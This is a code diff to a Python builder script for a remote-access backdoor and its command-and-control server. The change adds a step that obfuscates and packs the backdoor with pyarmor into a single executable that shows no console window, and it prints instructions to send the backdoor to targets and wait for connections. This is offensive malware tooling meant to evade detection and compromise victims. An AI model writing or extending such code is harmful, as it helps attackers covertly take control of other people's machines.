@@ -3,7 +3,8 @@
 
 import subprocess
 import platform
-import sys
+import shutil
+import os
 
 # detect OS type ###############
 if "Linux" in platform.uname():
@@ -120,6 +121,28 @@ password = """+"'"+password+"'"+"""
     f = open(setting_path,"w")
     f.write(setting)
     f.close()
-    print yellow,"\n\n[*] setting file created [*]\n now send the backdoor, run cnc.py and wait for connections...\n happy hacking:)"
+    choice = raw_input("\033[1;32;33m\n[*] Do you want to obfuscate and pack the backdoor?(Y/n) \x1b[0m")
+    if choice == "" or choice == "y" or choice == "Y":
+        obfuscate()
+    else:
+        print green,"\n[+] Configuration completed successfully, send the backdoor and run the cnc... happy hacking :) [+]",r
+
+def obfuscate():
+    print cyan,"""\n\n
+    pyarmor obfuscation options:
+    --obf-mod {0,1,2}
+    --obf-code {0,1,2}
+    --wrap-mode {0,1}
+    --advanced {0,1,2,3,4}
+    """,r
+    options = raw_input("\033[1;32;32m[>] Do you have any extra options for pyarmor obfuscation?(N/y)\x1b[0m ")
+    if options == "y":
+        arguments = raw_input("[>] enter the space-separated options for pyarmor obfuscation:  ")
+        print yellow,"\n[*] Obfuscation and packing started, please wait... [*]\n",r
+        print(subprocess.check_output('pyarmor pack -x "'+str(arguments)+'" -e "--onefile --noconsole" backdoor.py', shell=True))
+    else:
+        print yellow, "\n[*] Obfuscation and packing started, please wait... [*]\n", r
+        print(subprocess.check_output('pyarmor pack -e "--onefile --noconsole" backdoor.py',shell=True))
+    print green,"[+] Obfuscation and packing completed successfully, the backdoor executable saved in dist directory [+]",r
 
 generator()
